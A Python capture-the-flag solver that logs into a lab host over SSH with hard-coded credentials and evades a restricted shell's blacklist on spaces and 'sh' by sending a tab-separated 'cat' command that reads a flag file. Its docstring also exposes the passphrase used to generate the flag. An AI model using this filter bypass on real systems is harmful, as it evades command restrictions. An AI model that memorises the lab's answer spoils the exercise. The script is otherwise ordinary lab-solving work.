#!/usr/bin/env python3
"""Retrieve the task-2 flag from the blacklist-restricted shell (10.42.7.170).

The remote shell blacklists the space character (' ') and the word 'sh', so
`cat /home/user/flag` is rejected.  A tab (\\t) is not a space, so the command
passes the filter and reads the flag.

The required value for 2-flag.txt is the space-free md5 digest that flag.sh
regenerates via gen_flag(CSQPYS3ME9GP6TR, <github_username>):
    md5sum <<< $(openssl aes-256-cbc -pass pass:CSQPYS3ME9GP6TR -nosalt -pbkdf2 <<< 12539-vusal) | head -c 32
"""

import re
import sys

import paramiko

HOST = "10.42.7.170"
USER = "user"
PASS = "user"
FLAG_FILE = "2-flag.txt"

PAYLOAD = "cat\t/home/user/flag\n"


def get_flag():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, username=USER, password=PASS, timeout=20)

    shell = client.invoke_shell()
    shell.settimeout(10)
    shell.recv(65535)  # drain banner

    shell.send(PAYLOAD)
    output = b""
    while True:
        try:
            chunk = shell.recv(65535)
        except Exception:
            break
        if not chunk:
            break
        output += chunk

    client.close()

    text = output.decode(errors="replace")
    match = re.search(r"CTF\{[^}]+\}", text)
    if not match:
        sys.exit(f"flag not found in output:\n{text}")
    return match.group(0)


def main():
    flag = get_flag()
    print(f"[+] full flag: {flag}")

    hash_match = re.search(r"([0-9a-f]{32})", flag)
    if not hash_match:
        sys.exit("no 32-hex digest found in flag")
    line = f"{hash_match.group(1)}\n"

    with open(FLAG_FILE, "w") as fh:
        fh.write(line)
    print(f"[+] saved digest to {FLAG_FILE}")


if __name__ == "__main__":
    main()